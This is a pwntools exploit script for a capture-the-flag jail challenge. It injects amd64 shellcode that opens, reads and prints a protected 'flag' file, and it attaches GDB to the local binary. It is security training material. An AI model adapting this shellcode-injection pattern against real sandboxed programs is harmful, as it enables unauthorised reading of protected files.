#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# For local testing
binary_path = './babyjail_level2'

shellcode = asm('''
    /* Just directly open the flag file */
    push 2
    push 2
    pop rax             /* SYS_open */
    lea rdi, [rip+flag_path]
    xor rsi, rsi        /* O_RDONLY */
    xor rdx, rdx
    syscall
    
    /* Check if open failed */
    cmp rax, 0
    jl fail
    
    mov rbx, rax        /* Save fd to flag */
    
    /* Read the flag content */
    xor rax, rax        /* SYS_read */
    mov rdi, rbx        /* Flag fd */
    lea rsi, [rip+buffer]
    mov rdx, 100        /* Read up to 100 bytes */
    syscall
    
    /* Check if read failed */
    cmp rax, 0
    jl fail
    
    mov r12, rax        /* Save bytes read */
    
    /* Write flag to stdout */
    mov rax, 1          /* SYS_write */
    mov rdi, 1          /* stdout */
    lea rsi, [rip+buffer]
    mov rdx, r12        /* Bytes read */
    syscall
    
    jmp exit
    
fail:
    /* Print error code */
    neg rax
    
    /* Write error message */
    mov rdi, rax        /* Save error code */
    mov rax, 1          /* SYS_write */
    push rdi            /* Store error code */
    mov rdi, 1          /* stdout */
    lea rsi, [rip+error_msg]
    mov rdx, error_len
    syscall
    pop rdi             /* Restore error code */
    
    /* Convert error code to ASCII and print it */
    add rdi, 48         /* Convert to ASCII digit */
    push rdi            /* Store on stack */
    mov rax, 1          /* SYS_write */
    mov rdi, 1          /* stdout */
    mov rsi, rsp        /* Pointer to digit on stack */
    mov rdx, 1          /* 1 byte */
    syscall
    pop rdi             /* Clean up stack */
    
exit:
    /* Exit */
    mov rax, 60         /* SYS_exit */
    xor rdi, rdi
    syscall

flag_path:
    .string "flag"      /* The flag file */
error_msg:
    .string "Error: Operation failed with code "
error_len = 34
buffer:
    .space 100
''')

# Start the process with /etc/passwd as our anchor point 
p = process([binary_path, '/etc/passwd'])

# Create simple GDB script
s = '''
b * main+874
b * 0x1337000
'''

# Attach GDB
gdb.attach(p, s)

# Send shellcode
p.send(shellcode)

# Get the output
p.interactive()
